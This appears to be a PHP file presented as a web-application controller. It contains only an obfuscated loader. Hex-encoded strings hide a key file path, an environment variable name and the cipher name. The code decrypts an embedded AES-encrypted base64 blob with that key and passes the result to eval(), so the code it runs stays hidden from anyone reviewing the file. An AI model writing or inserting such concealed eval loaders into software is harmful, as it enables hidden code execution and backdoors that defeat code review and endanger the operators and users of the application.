<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('uIA4e9BGvyZutmb7pnc0Dw==');

$c=base64_decode(

'flfZxaiRl0eCGQL+t/yQlUyugCv8pm9RhmyLhpoW6asUVjJkNDb0uZfIDcD9bZyMMrMexneujh8j' .
'oRJIz2zubBXxtBMxZ2gqSggwjABusRzM1E1C9w1ssD0ol65zGS6HoQElJhgz0JW+OwrSAl4NhQLD' .
'9fH9ZyQUzVnGMKBSzAjn7qY9RqURoc5Z9YLstbOf0c/VHN1BtmkTigswBhrP6qK1qje4Mpj+fmGe' .
'DBKVLzNvMILWAihrdvBek9Aoc2j4naqBWMGFnzC4UX5/9Ho92QnTVTZ8oWwKWerqzI6E3DB5Ukfe' .
'/PznvxAzizAiW6qJpQe6bcor3gxn/oXGaYzFi0Tl/tys0AMCWYOIEtCv+iizNlyHB8a5VVMN7vwM' .
'sgEc5AzBj3Kl/xWdqPWJPudRuA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

